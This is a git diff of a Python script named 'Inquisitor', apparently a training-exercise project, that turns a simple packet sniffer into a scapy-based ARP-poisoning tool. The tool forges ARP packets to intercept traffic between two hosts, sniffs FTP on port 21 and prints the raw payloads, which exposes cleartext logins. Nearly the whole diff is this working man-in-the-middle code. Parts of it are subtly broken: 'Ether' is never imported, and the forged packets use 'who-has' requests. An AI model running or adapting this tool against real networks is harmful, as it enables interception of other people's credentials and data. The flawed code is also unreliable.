@@ -1,35 +1,77 @@
-#! /usr/local/bin/python3
+#!/usr/bin/env python3
 
 import argparse
-import pcapy
-import select
+import ipaddress
+import re
+from scapy.all import sniff, send, ARP, TCP, Raw
+from uuid import getnode
+from signal import signal, SIGINT
+
+def check_args():
+    for k, v in vars(args).items():
+        if k == "ip_src" or k == "ip_target":
+            try:
+                ipaddress.IPv4Address(v)
+            except ipaddress.AddressValueError:
+                print(f"Invalid IPv4 address: {v}")
+                exit(1)
+        elif k == "mac_src" or k == "mac_target":
+            if not re.match(r"^([0-9a-fA-F]{2}[:-]){5}([0-9a-fA-F]{2})$", v):
+                print(f"Invalid MAC address: {v}")
+                exit(1)
+
+def process_packet(packet):
+    """
+    Process the sniffed ftp packet and print transferred data.
+    """
+    if packet.haslayer(Ether) and packet.haslayer(TCP):
+        if packet[TCP].dport == 21:
+            if packet.haslayer(Raw):
+                print(packet[Raw].load)
+
+
+def poison(ip_src, mac_src, ip_target, mac_target, mac_sniffer):
+    """
+    ARP poisoning.
+    """
+    packet1 = ARP(op="who-has", psrc=ip_src, hwsrc=mac_sniffer, pdst=ip_target, hwdst=mac_target)
+    packet2 = ARP(op="who-has", psrc=ip_target, hwsrc=mac_sniffer, pdst=ip_src, hwdst=mac_src)
+    print("sending poisoned ARP response...")
+    send(packet1, count=1)
+    send(packet2, count=1)
+    print("sniffing...")
+    sniff(filter="tcp port 21", prn=process_packet, store=0, timeout=10)
+
+def restore(ip_src, mac_src, ip_target, mac_target):
+    """
+    Restore the ARP table of the target machine.
+    """
+    packet1 = ARP(op="who-has", psrc=ip_src, hwsrc=mac_src, pdst=ip_target, hwdst=mac_target)
+    packet2 = ARP(op="who-has", psrc=ip_target, hwsrc=mac_target, pdst=ip_src, hwdst=mac_src)
+    print("restoring true ARP table...")
+    send(packet1, count=1)
+    send(packet2, count=1)
+
+def sigint_handler(signal, frame):
+    """
+        Handle the SIGINT signal to restore the ARP cache and exit the program.
+    """
+    restore(args.ip_src, args.mac_src, args.ip_target, args.mac_target)
+    print("Exiting...")
+    exit(0)
 
 if __name__ == "__main__":
-    # parse four command line arguments
     parser = argparse.ArgumentParser(description="Inquisitor: a program that performs ARP poisoning.")
-    parser.add_argument("IP-src")
-    parser.add_argument("MAC-src")
-    parser.add_argument("IP-target")
-    parser.add_argument("MAC-target")
+    parser.add_argument("ip_src", help="IP address of the source machine")
+    parser.add_argument("mac_src", help="MAC address of the source machine")
+    parser.add_argument("ip_target", help="IP address of the target machine")
+    parser.add_argument("mac_target", help="MAC address of the target machine")
     args = parser.parse_args()
     print(args)
+    check_args()
 
-    # get the interface name
-    device = pcapy.findalldevs()[0]
-    print(f"Devices: {device}")
-    # open the device
-    pcap = pcapy.open_live(device, 65536, 1, 0)
-    # start sniffing
+    mac_sniffer = ":".join(hex(getnode())[i:i + 2] for i in range(2, 14, 2))
+    signal(SIGINT, sigint_handler)
+
     while True:
-        try:
-            # fd = pcap.getfd()
-            # rlist, _, _ = select.select([fd], [], [], 1)
-            # if fd in rlist:
-            # get the packet
-            (header, packet) = pcap.next()
-            # print the packet
-            print(f"Packet: {packet}")
-        except KeyboardInterrupt:
-            print("Exiting...")
-            break
-
+        poison(args.ip_src, args.mac_src, args.ip_target, args.mac_target, mac_sniffer)
